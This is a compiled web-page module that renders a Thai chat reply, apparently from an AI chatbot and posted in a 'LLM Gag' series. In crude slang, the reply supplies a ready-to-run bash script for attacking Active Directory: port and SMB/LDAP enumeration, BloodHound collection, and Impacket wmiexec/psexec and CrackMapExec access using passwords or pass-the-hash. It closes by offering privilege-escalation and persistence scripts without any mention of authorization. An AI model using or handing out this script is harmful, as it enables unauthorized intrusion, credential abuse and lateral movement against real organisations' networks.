import{a as e,i as t,s as n,t as r}from"./app-CchzzT6L.js";var i=JSON.parse(`{"path":"/AI/LLM%20Gag/real-world-ep5.html","title":"🔥 Full Active Directory Pentest Script (เบื้องต้น) 🔥","lang":"en-US","frontmatter":{},"git":{"updatedTime":1749378724000,"contributors":[{"name":"hifat","username":"hifat","email":"logmanxsa@gmail.com","commits":1,"url":"https://github.com/hifat"}],"changelog":[{"hash":"12e48b94e378386433cc3f7be77fabe628f721c0","time":1749378724000,"email":"logmanxsa@gmail.com","author":"hifat","message":"add llm gag content"}]},"filePathRelative":"AI/LLM Gag/real-world-ep5.md"}`),a={name:`real-world-ep5.md`};function o(r,i,a,o,s,c){return n(),t(`div`,null,[...i[0]||=[e(`<p>โอเคเพื่อน! นี่คือ <strong>สคริปต์เจาะ Active Directory แบบเต็มแม็กซ์</strong> ที่มึงจะเอาไปลุยเลยใน Kali Linux สคริปต์นี้จะช่วยมึงทำ Recon, Enumeration, และเบื้องต้นของ Exploitation ได้แบบครอบคลุม!</p><hr><h1 id="🔥-full-active-directory-pentest-script-เบื้องต้น-🔥" tabindex="-1"><a class="header-anchor" href="#🔥-full-active-directory-pentest-script-เบื้องต้น-🔥"><span>🔥 Full Active Directory Pentest Script (เบื้องต้น) 🔥</span></a></h1><div class="language-bash line-numbers-mode line-numbers-mode" data-highlighter="prismjs" data-ext="sh"><pre class="shiki github-dark vp-code" style="background-color:#24292e;color:#e1e4e8;"><code><span class="line"><span class="line"><span style="color:#6A737D;">#!/bin/bash</span></span></span>
<span class="line"><span class="line"></span></span>
<span class="line"><span class="line"><span style="color:#6A737D;"># เปลี่ยนค่าตรงนี้ตามของมึง</span></span></span>
<span class="line"><span class="line"><span style="color:#E1E4E8;">TARGET_IP</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&quot;10.10.xx.xx&quot;</span></span></span>
<span class="line"><span class="line"><span style="color:#E1E4E8;">DOMAIN</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&quot;domain.local&quot;</span></span></span>
<span class="line"><span class="line"><span style="color:#E1E4E8;">USER</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&quot;youruser&quot;</span></span></span>
<span class="line"><span class="line"><span style="color:#E1E4E8;">PASS</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&quot;yourpassword&quot;</span></span></span>
<span class="line"><span class="line"><span style="color:#E1E4E8;">HASH</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&quot;&quot;</span><span style="color:#6A737D;">  # ถ้ามี hash ใส่ตรงนี้ (LMHASH:NTHASH) ถ้าไม่มีก็เว้นว่าง</span></span></span>
<span class="line"><span class="line"></span></span>
<span class="line"><span class="line"><span style="color:#79B8FF;">echo</span><span style="color:#9ECBFF;"> &quot;[*] Starting full AD recon and pentest on </span><span style="color:#E1E4E8;">$TARGET_IP</span><span style="color:#9ECBFF;">&quot;</span></span></span>
<span class="line"><span class="line"></span></span>
<span class="line"><span class="line"><span style="color:#79B8FF;">echo</span><span style="color:#9ECBFF;"> &quot;[*] Step 1: Nmap Scan - Full TCP ports with default scripts and version detection&quot;</span></span></span>
<span class="line"><span class="line"><span style="color:#B392F0;">nmap</span><span style="color:#79B8FF;"> -sC</span><span style="color:#79B8FF;"> -sV</span><span style="color:#79B8FF;"> -p-</span><span style="color:#E1E4E8;"> $TARGET_IP </span><span style="color:#79B8FF;">-oN</span><span style="color:#9ECBFF;"> nmap_full.txt</span></span></span>
<span class="line"><span class="line"></span></span>
<span class="line"><span class="line"><span style="color:#79B8FF;">echo</span><span style="color:#9ECBFF;"> &quot;[*] Step 2: SMB Enumeration with enum4linux&quot;</span></span></span>
<span class="line"><span class="line"><span style="color:#B392F0;">enum4linux</span><span style="color:#79B8FF;"> -a</span><span style="color:#E1E4E8;"> $TARGET_IP </span><span style="color:#F97583;">&gt;</span><span style="color:#9ECBFF;"> enum4linux_all.txt</span></span></span>
<span class="line"><span class="line"></span></span>
<span class="line"><span class="line"><span style="color:#79B8FF;">echo</span><span style="color:#9ECBFF;"> &quot;[*] Step 3: SMB Shares and Users with smbclient&quot;</span></span></span>
<span class="line"><span class="line"><span style="color:#B392F0;">smbclient</span><span style="color:#79B8FF;"> -L</span><span style="color:#9ECBFF;"> //</span><span style="color:#E1E4E8;">$TARGET_IP </span><span style="color:#79B8FF;">-U</span><span style="color:#9ECBFF;"> &quot;</span><span style="color:#E1E4E8;">$USER</span><span style="color:#9ECBFF;">%</span><span style="color:#E1E4E8;">$PASS</span><span style="color:#9ECBFF;">&quot;</span></span></span>
<span class="line"><span class="line"></span></span>
<span class="line"><span class="line"><span style="color:#79B8FF;">echo</span><span style="color:#9ECBFF;"> &quot;[*] Step 4: LDAP Enumeration with ldapsearch (if ldap-utils installed)&quot;</span></span></span>
<span class="line"><span class="line"><span style="color:#B392F0;">ldapsearch</span><span style="color:#79B8FF;"> -x</span><span style="color:#79B8FF;"> -h</span><span style="color:#E1E4E8;"> $TARGET_IP </span><span style="color:#79B8FF;">-b</span><span style="color:#9ECBFF;"> &quot;dc=$(</span><span style="color:#79B8FF;">echo</span><span style="color:#E1E4E8;"> $DOMAIN</span><span style="color:#F97583;"> |</span><span style="color:#B392F0;"> sed</span><span style="color:#9ECBFF;"> &#39;s/\\./,dc=/g&#39;)&quot;</span><span style="color:#9ECBFF;"> &quot;(objectclass=*)&quot;</span><span style="color:#F97583;"> &gt;</span><span style="color:#9ECBFF;"> ldapsearch_all.txt</span></span></span>
<span class="line"><span class="line"></span></span>
<span class="line"><span class="line"><span style="color:#79B8FF;">echo</span><span style="color:#9ECBFF;"> &quot;[*] Step 5: Run BloodHound (Assuming SharpHound ingestor is available and you have access)&quot;</span></span></span>
<span class="line"><span class="line"><span style="color:#6A737D;"># Upload SharpHound.exe to target manually or via SMB, then run and download zip results</span></span></span>
<span class="line"><span class="line"><span style="color:#79B8FF;">echo</span><span style="color:#9ECBFF;"> &quot;  - Upload and run SharpHound.exe on target manually.&quot;</span></span></span>
<span class="line"><span class="line"></span></span>
<span class="line"><span class="line"><span style="color:#79B8FF;">echo</span><span style="color:#9ECBFF;"> &quot;[*] Step 6: Try Impacket wmiexec with password&quot;</span></span></span>
<span class="line"><span class="line"><span style="color:#F97583;">if</span><span style="color:#E1E4E8;"> [ </span><span style="color:#F97583;">-z</span><span style="color:#9ECBFF;"> &quot;</span><span style="color:#E1E4E8;">$HASH</span><span style="color:#9ECBFF;">&quot;</span><span style="color:#E1E4E8;"> ]; </span><span style="color:#F97583;">then</span></span></span>
<span class="line"><span class="line"><span style="color:#B392F0;">    wmiexec.py</span><span style="color:#E1E4E8;"> $DOMAIN</span><span style="color:#9ECBFF;">/</span><span style="color:#E1E4E8;">$USER</span><span style="color:#9ECBFF;">@</span><span style="color:#E1E4E8;">$TARGET_IP </span><span style="color:#79B8FF;">-password</span><span style="color:#E1E4E8;"> $PASS</span></span></span>
<span class="line"><span class="line"><span style="color:#F97583;">else</span></span></span>
<span class="line"><span class="line"><span style="color:#B392F0;">    wmiexec.py</span><span style="color:#E1E4E8;"> $DOMAIN</span><span style="color:#9ECBFF;">/</span><span style="color:#E1E4E8;">$USER</span><span style="color:#9ECBFF;">@</span><span style="color:#E1E4E8;">$TARGET_IP </span><span style="color:#79B8FF;">-hashes</span><span style="color:#E1E4E8;"> $HASH</span></span></span>
<span class="line"><span class="line"><span style="color:#F97583;">fi</span></span></span>
<span class="line"><span class="line"></span></span>
<span class="line"><span class="line"><span style="color:#79B8FF;">echo</span><span style="color:#9ECBFF;"> &quot;[*] Step 7: Try Impacket psexec with password&quot;</span></span></span>
<span class="line"><span class="line"><span style="color:#F97583;">if</span><span style="color:#E1E4E8;"> [ </span><span style="color:#F97583;">-z</span><span style="color:#9ECBFF;"> &quot;</span><span style="color:#E1E4E8;">$HASH</span><span style="color:#9ECBFF;">&quot;</span><span style="color:#E1E4E8;"> ]; </span><span style="color:#F97583;">then</span></span></span>
<span class="line"><span class="line"><span style="color:#B392F0;">    psexec.py</span><span style="color:#E1E4E8;"> $DOMAIN</span><span style="color:#9ECBFF;">/</span><span style="color:#E1E4E8;">$USER</span><span style="color:#9ECBFF;">@</span><span style="color:#E1E4E8;">$TARGET_IP </span><span style="color:#79B8FF;">-password</span><span style="color:#E1E4E8;"> $PASS</span></span></span>
<span class="line"><span class="line"><span style="color:#F97583;">else</span></span></span>
<span class="line"><span class="line"><span style="color:#B392F0;">    psexec.py</span><span style="color:#E1E4E8;"> $DOMAIN</span><span style="color:#9ECBFF;">/</span><span style="color:#E1E4E8;">$USER</span><span style="color:#9ECBFF;">@</span><span style="color:#E1E4E8;">$TARGET_IP </span><span style="color:#79B8FF;">-hashes</span><span style="color:#E1E4E8;"> $HASH</span></span></span>
<span class="line"><span class="line"><span style="color:#F97583;">fi</span></span></span>
<span class="line"><span class="line"></span></span>
<span class="line"><span class="line"><span style="color:#79B8FF;">echo</span><span style="color:#9ECBFF;"> &quot;[*] Step 8: Use CrackMapExec for automation and lateral movement&quot;</span></span></span>
<span class="line"><span class="line"><span style="color:#F97583;">if</span><span style="color:#E1E4E8;"> [ </span><span style="color:#F97583;">-z</span><span style="color:#9ECBFF;"> &quot;</span><span style="color:#E1E4E8;">$HASH</span><span style="color:#9ECBFF;">&quot;</span><span style="color:#E1E4E8;"> ]; </span><span style="color:#F97583;">then</span></span></span>
<span class="line"><span class="line"><span style="color:#B392F0;">    crackmapexec</span><span style="color:#9ECBFF;"> smb</span><span style="color:#E1E4E8;"> $TARGET_IP </span><span style="color:#79B8FF;">-u</span><span style="color:#E1E4E8;"> $USER </span><span style="color:#79B8FF;">-p</span><span style="color:#E1E4E8;"> $PASS</span></span></span>
<span class="line"><span class="line"><span style="color:#F97583;">else</span></span></span>
<span class="line"><span class="line"><span style="color:#B392F0;">    crackmapexec</span><span style="color:#9ECBFF;"> smb</span><span style="color:#E1E4E8;"> $TARGET_IP </span><span style="color:#79B8FF;">-u</span><span style="color:#E1E4E8;"> $USER </span><span style="color:#79B8FF;">-H</span><span style="color:#E1E4E8;"> $HASH</span></span></span>
<span class="line"><span class="line"><span style="color:#F97583;">fi</span></span></span>
<span class="line"><span class="line"></span></span>
<span class="line"><span class="line"><span style="color:#79B8FF;">echo</span><span style="color:#9ECBFF;"> &quot;[*] Pentest script finished. Check output files and results!&quot;</span></span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"></div><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><hr><h2 id="วิธีใช้" tabindex="-1"><a class="header-anchor" href="#วิธีใช้"><span>วิธีใช้</span></a></h2><ol><li>เซฟไฟล์เป็น <code>active_pentest.sh</code></li><li>เปลี่ยนค่าตัวแปร <code>TARGET_IP</code>, <code>DOMAIN</code>, <code>USER</code>, <code>PASS</code>, <code>HASH</code> ให้ตรงกับเป้าหมาย</li><li>รันใน Kali ด้วยคำสั่ง</li></ol><div class="language-bash line-numbers-mode line-numbers-mode" data-highlighter="prismjs" data-ext="sh"><pre class="shiki github-dark vp-code" style="background-color:#24292e;color:#e1e4e8;"><code><span class="line"><span class="line"><span style="color:#B392F0;">chmod</span><span style="color:#9ECBFF;"> +x</span><span style="color:#9ECBFF;"> active_pentest.sh</span></span></span>
<span class="line"><span class="line"><span style="color:#B392F0;">./active_pentest.sh</span></span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"></div><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><hr><h2 id="หมายเหตุสําคัญ" tabindex="-1"><a class="header-anchor" href="#หมายเหตุสําคัญ"><span>หมายเหตุสำคัญ</span></a></h2><ul><li>สคริปต์นี้เป็นแค่จุดเริ่มต้น สำหรับ Recon และลองเข้าถึงระบบ</li><li><strong>ยังต้องใช้เทคนิคเพิ่มเติม</strong> ในการ Privilege Escalation และ Lateral Movement</li><li>ถ้าต้องการสคริปต์ขั้นสูง หรือเน้น privilege escalation/ persistence บอกกูได้เลย!</li></ul><hr><p>เพื่อน… ลุยให้เต็มที่! ถ้าเจออะไรติดขัด มึงก็แค่เรียกกูมาช่วยอีกที 😎🔥</p>`,13)]])}var s=r(a,[[`render`,o]]);export{i as _pageData,s as default};